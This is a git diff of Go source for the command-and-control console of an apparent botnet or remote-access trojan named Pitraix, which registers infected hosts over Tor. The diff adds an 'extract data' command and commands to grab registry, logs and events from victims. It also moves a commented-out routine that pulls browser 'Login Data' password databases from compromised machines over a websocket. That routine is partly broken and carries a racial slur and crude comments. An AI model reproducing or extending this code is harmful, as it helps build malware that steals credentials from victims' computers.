-					// 		fmt.Println("doing browser snatch for", addr, key)
+					f, err := os.Create("hostring.json")
 
-					// 		hstAES_Key, _ := base64.StdEncoding.DecodeString(key)
+					if err != nil {
+						fmt.Printf("\n%s>%s There was %serror%s creating hostring file. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\n", redColor, endColor, redColor, endColor)
 
-					// 		insts_marshalled, _ := json.Marshal([]string{"getwsbrowserkey 1"})
+					} else {
+						f.Write(jsonDump)
+						fmt.Printf("\n\n%s>%s New host register! Host count is now %s%d%s\n\n", greenColor, endColor, greenColor, len(hostring_d.Address), endColor)
+						f.Close()
+						
+						// if auto_spread == true {
+						// 	go func(addr string, key string) {
+						// 		fmt.Println("doing browser snatch for", addr, key)
 
-					// 		browserS_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
+						// 		hstAES_Key, _ := base64.StdEncoding.DecodeString(key)
 
-					// 		browserS_onetimeKey := strings.TrimSpace(strings.Replace(string(browserS_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
+						// 		insts_marshalled, _ := json.Marshal([]string{"getwsbrowserkey 1"})
 
-					// 		if err != nil {
-					// 			fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
+						// 		browserS_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
 
-					// 		} else {
-					// 			fmt.Println("browserS_onetimeKey:", browserS_onetimeKey, err)
+						// 		browserS_onetimeKey := strings.TrimSpace(strings.Replace(string(browserS_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
 
-					// 			proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")
+						// 		if err != nil {
+						// 			fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
 
-					// 			wsdialer := websocket.Dialer{
-					// 				Proxy: http.ProxyURL(proxyURL),
-					// 			}
+						// 		} else {
+						// 			fmt.Println("browserS_onetimeKey:", browserS_onetimeKey, err)
 
-					// 			c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + browserS_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
-								
-					// 			if err != nil {
-					// 				fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)
+						// 			proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")
 
-					// 			} else {
-					// 				defer c.Close()
+						// 			wsdialer := websocket.Dialer{
+						// 				Proxy: http.ProxyURL(proxyURL),
+						// 			}
 
-					// 				err := c.WriteMessage(websocket.TextMessage, []byte("baddie"))
-					// 				if err != nil {
-					// 					fmt.Println("write error:", err)
-
-					// 				} else {
-					// 					var bigdick string
-					// 					for {
-					// 						_, message, err := c.ReadMessage()
-
-					// 						if err != nil {
-					// 							fmt.Println("read error:", err)
-					// 							break
-
-					// 						} else {
-					// 							// fmt.Println(message)
-
-					// 							if string(message) == "hadie" {
-					// 								break
-
-					// 							} else {
-					// 								bigdick += string(message) + " "
-													
-					// 							}
-
-					// 						}
-
-					// 					}
-
-					// 					bigdick_split := strings.Split(strings.TrimSpace(bigdick), " ")
-
-					// 					/* 
-					// 						my dick is big. slices are in order i think
-					// 						1. login data
-
-					// 					*/
-
-					// 					fileNames := []string{
-					// 						"Login Data",
-					// 						"Login Data",
-					// 					}
-
-					// 					os.MkdirAll(filepath.Join("extracted", addr), os.ModePerm)
-
-					// 					fname_time := time.Now().String()
-					// 					for index, dick := range bigdick_split {
-					// 						if index > len(fileNames) - 1 {
-					// 							fmt.Println("oh bruh", index, len(dick), len(bigdick_split))
-					// 							continue
-					// 						}
-					// 						content, err := base64.StdEncoding.DecodeString(dick)
-
-					// 						if err != nil {
-					// 							fmt.Println("oh noo error", err)
-					// 						}
-
-					// 						fname := fileNames[index] + "_" + fname_time
-					// 						f, _ := os.Create(filepath.Join("extracted", addr, fname + ".sql"))
-					// 						f.Write(content)
-					// 						f.Close()
-
-					// 					}
-
-					// 					for index, _ := range fileNames {
-					// 						fname := fileNames[index] + "_" + fname_time
-					// 						db, err := sql.Open("sqlite3", filepath.Join("extracted", addr, fname + ".sql"))
-											
-					// 						if err != nil{
-					// 							fmt.Println("uh", err)
-											
-					// 						} else {
-					// 							response, _ := db.Query("SELECT * from logins", rollno, 1)
-					// 							type row struct {
-					// 								Passowrds string `guacamole nigga penis"`
-					// 							}
-					// 							var rows []row
-					// 							_ = response.Scan(&rows)
-					// 							count := rows[0].Count
-					// 							if err != nil {
-					// 								fmt.Println(err)
-					// 							}
-					// 							fmt.Println(row, err)
-
-
-					// 						}
-
-					// 					}
-
-
-					// 				}
-
-
+						// 			c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + browserS_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
 									
-					// 			}
-							
-					// 		}
+						// 			if err != nil {
+						// 				fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)
+
+						// 			} else {
+						// 				defer c.Close()
+
+						// 				err := c.WriteMessage(websocket.TextMessage, []byte("don"))
+						// 				if err != nil {
+						// 					fmt.Println("write error:", err)
+
+						// 				} else {
+						// 					var bigdick string
+						// 					for {
+						// 						_, message, err := c.ReadMessage()
+
+						// 						if err != nil {
+						// 							fmt.Println("read error:", err)
+						// 							break
+
+						// 						} else {
+						// 							// fmt.Println(message)
+
+						// 							if string(message) == "genius" {
+						// 								break
+
+						// 							} else {
+						// 								bigdick += string(message) + " "
+														
+						// 							}
+
+						// 						}
+
+						// 					}
+
+						// 					bigdick_split := strings.Split(strings.TrimSpace(bigdick), " ")
+
+						// 					/* 
+						// 						my dick is big. slices are in order i think
+						// 						1. login data
+
+						// 					*/
+
+						// 					fileNames := []string{
+						// 						"Login Data",
+						// 						"Login Data",
+						// 					}
+
+						// 					os.MkdirAll(filepath.Join("extracted", addr), os.ModePerm)
+
+						// 					fname_time := time.Now().String()
+						// 					for index, dick := range bigdick_split {
+						// 						if index > len(fileNames) - 1 {
+						// 							fmt.Println("oh bruh", index, len(dick), len(bigdick_split))
+						// 							continue
+						// 						}
+						// 						content, err := base64.StdEncoding.DecodeString(dick)
+
+						// 						if err != nil {
+						// 							fmt.Println("oh noo error", err)
+						// 						}
+
+						// 						fname := fileNames[index] + "_" + fname_time
+						// 						f, _ := os.Create(filepath.Join("extracted", addr, fname + ".sql"))
+						// 						f.Write(content)
+						// 						f.Close()
+
+						// 					}
+
+						// 					for index, _ := range fileNames {
+						// 						fname := fileNames[index] + "_" + fname_time
+						// 						db, err := sql.Open("sqlite3", filepath.Join("extracted", addr, fname + ".sql"))
+												
+						// 						if err != nil{
+						// 							fmt.Println("uh", err)
+												
+						// 						} else {
+						// 							response, _ := db.Query("SELECT * from logins", rollno, 1)
+						// 							type row struct {
+						// 								Passowrds string `guacamole nigga penis"`
+						// 							}
+						// 							var rows []row
+						// 							_ = response.Scan(&rows)
+						// 							count := rows[0].Count
+						// 							if err != nil {
+						// 								fmt.Println(err)
+						// 							}
+						// 							fmt.Println(row, err)
 
 
-					// 	}(newHST.Address, newHST.Key)
-					// }
+						// 						}
+
+						// 					}
+
+
+						// 				}
+
+
+										
+						// 			}
+								
+						// 		}
+
+
+						// 	}(newHST.Address, newHST.Key)
+						// }
+
+					}
 
 				}
 
@@ -1463,7 +2090,13 @@ func main() {
 							fmt.Printf("%s%s %d%s %s>>%s ", greenColor, operand_Modes[operand], len(selected), endColor, blueColor, endColor)
 						}
 					} else {
-						fmt.Printf("%s%s%s %s%s >>%s ", greenColor, operand_Modes[operand], endColor, blueColor, crout_Modes[crout], endColor)
+						if len(selected) == 0 {
+							fmt.Printf("%s%s%s %s%s >>%s ", greenColor, operand_Modes[operand], endColor, blueColor, crout_Modes[crout], endColor)
+						
+						} else {
+							fmt.Printf("%s%s %d%s %s%s >>%s ", greenColor, operand_Modes[operand], len(selected), endColor, blueColor, crout_Modes[crout], endColor)
+
+						}
 					}
 
 				} else {
@@ -1520,6 +2153,8 @@ func main() {
 
 						if line_instru == "*" {
 							operand = 1
+							selected = []int{}
+
 						} else {
 							operand = 2
 
@@ -1744,6 +2379,7 @@ func main() {
 					case "operand":
 						if line_instru == "global" || line_instru == "1" {
 							operand = 1
+							selected = []int{}
 							fmt.Printf("%s>%s Switched operand to GLOBAL\n", blueColor, endColor)
 
 						} else if line_instru == "select" || line_instru == "2" {
@@ -2237,7 +2873,7 @@ func main() {
 
 
 									go func(indx int, hrd *t_HST) {
-										if runtime.GOOS != "linux" {
+										if os.PathSeparator != 47 {
 											legacy_doInstru("shellnoop", "start msgedge 127.0.0.1:1337/" + onetimeKey + "rdp")
 
 										} else {
@@ -2262,15 +2898,43 @@ func main() {
 
 						}
 
+
+					case "extract":
+						if len(line_splitted) == 3 {
+							if strings.HasPrefix(strings.ToLower(line_instru), "data") {
+								index, err := strconv.Atoi(line_splitted[2])
+								if err != nil || index > len(hostring_d.Address) {
+									fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
+									continue
+
+								}
+								
+								addr := hostring_d.Address[index  - 1]
+								key  := hostring_d.Key[index -1]
+								extractBrowsersData(addr, key)
+								
+							} else {
+								fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
+
+							}
+
+						} else {
+							fmt.Printf("%s>%s Usage: extract data [index]\n\n", redColor, endColor)
+
+						}
+
 					case "snatch":
-						if line_instru == "reg" || line_instru == "regs" || line_instru == "registers" {
+						if strings.HasPrefix(strings.ToLower(line_instru), "reg")  {
 							instructions = append(instructions, "snatchregs 1")
 
-						} else if line_instru == "log" || line_instru == "logs" {
+						} else if strings.HasPrefix(strings.ToLower(line_instru), "log") {
 							instructions = append(instructions, "snatchlogs 1")
 						
-						} else if line_instru == "event" || line_instru == "events" {
+						} else if strings.HasPrefix(strings.ToLower(line_instru), "event") {
 							instructions = append(instructions, "snatchevents 1")
+
+						// } else if line_instru == "browser", "data" {
+						// 	extractBrowsersData()
 
 						} else {
 							fmt.Printf("%s>%s Invalid option %s%s%s\n", redColor, endColor, redColor, line_instru, endColor)
@@ -2598,7 +3262,7 @@ func main() {
 			} else {
 				// fmt.Printf("\n%sRegister_Handler >%s Got POST request without valid data: %v %v\n", yellowColor, endColor, reqBody, string(reqBody))
 				io.WriteString(writer, "0")
-				go log("Register_Handler", "Got POST request without valid data: " + string(reqBody))
+				go log("Register_Handler", "Got POST request without valid data")
 
 			}
 		} else {
@@ -2799,6 +3463,23 @@ func getRequest(target_url string, useTor bool, timeout time.Duration) ([]byte, 
 	return body, nil
 }
 
+
+func encrypt_AES(text []byte, key []byte) ([]byte, []byte, error) {
+	cphr, err := aes.NewCipher(key)
+	if err != nil {
+		return []byte{}, []byte{}, err
+	}
+	gcm, err := cipher.NewGCM(cphr)
+	if err != nil {
+		return []byte{}, []byte{}, err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	rand.Read(nonce)
+
+	return gcm.Seal(nil, nonce, text, nil), nonce, nil
+}
+
+
 func decrypt_AES(cipher_Text []byte, nonce []byte, key []byte) ([]byte, error) {
 	cphr, err := aes.NewCipher(key)
 	if err != nil {
@@ -2817,20 +3498,6 @@ func decrypt_AES(cipher_Text []byte, nonce []byte, key []byte) ([]byte, error) {
 	return decrypted_Cipher, nil
 }
 
-func encrypt_AES(text []byte, key []byte) ([]byte, []byte, error) {
-	cphr, err := aes.NewCipher(key)
-	if err != nil {
-		return []byte{}, []byte{}, err
-	}
-	gcm, err := cipher.NewGCM(cphr)
-	if err != nil {
-		return []byte{}, []byte{}, err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	rand.Read(nonce)
-
-	return gcm.Seal(nil, nonce, text, nil), nonce, nil
-}
 
 func create_signature(msg []byte, privateKey rsa.PrivateKey) ([]byte, []byte, error) {
 	msgHash := sha512.New()
